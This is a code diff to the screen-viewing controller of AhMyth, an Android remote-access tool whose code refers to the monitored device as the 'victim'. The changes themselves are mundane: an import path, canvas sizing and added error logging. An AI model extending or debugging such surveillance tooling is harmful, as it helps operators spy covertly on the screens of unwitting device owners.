@@ -2,7 +2,7 @@ const { remote } = require('electron');
 const { ipcRenderer } = require('electron');
 var app = angular.module('myappy', ['ngRoute', 'infinite-scroll']);
 var fs = require("fs-extra");
-const CONSTANTS = require(__dirname + '/assets/js/Constants')
+const CONSTANTS = require('../../Constants');
 var ORDER = CONSTANTS.order;
 var originalSocket = remote.getCurrentWebContents().victim;
 var homedir = require('node-homedir');
@@ -1146,12 +1146,15 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
             initCanvas();
         }
         
-        if (!canvas || !ctx) return;
+        if (!canvas || !ctx) {
+            console.error('[AhMyth] Canvas not initialized');
+            return;
+        }
         
         var img = new Image();
         img.onload = function() {
-            canvas.width = img.width;
-            canvas.height = img.height;
+            canvas.width = width || img.width;
+            canvas.height = height || img.height;
             ctx.drawImage(img, 0, 0);
             $ScreenCtrl.currentFrame = base64Image;
             fpsCounter++;
@@ -1159,6 +1162,9 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
             if (!$ScreenCtrl.$$phase) {
                 $ScreenCtrl.$apply();
             }
+        };
+        img.onerror = function(err) {
+            console.error('[AhMyth] Failed to load image', err);
         };
         img.src = 'data:image/jpeg;base64,' + base64Image;
     }
@@ -1395,6 +1401,8 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
             $rootScope.Log(`[✓] Screen: ${data.width}x${data.height}`, CONSTANTS.logStatus.SUCCESS);
         } else if (data.quality) {
             $rootScope.Log(`[✓] Quality: ${data.quality}%`, CONSTANTS.logStatus.SUCCESS);
+        } else {
+            console.log('[AhMyth] Received screen data without image or error:', data);
         }
         
         if (!$ScreenCtrl.$$phase) {
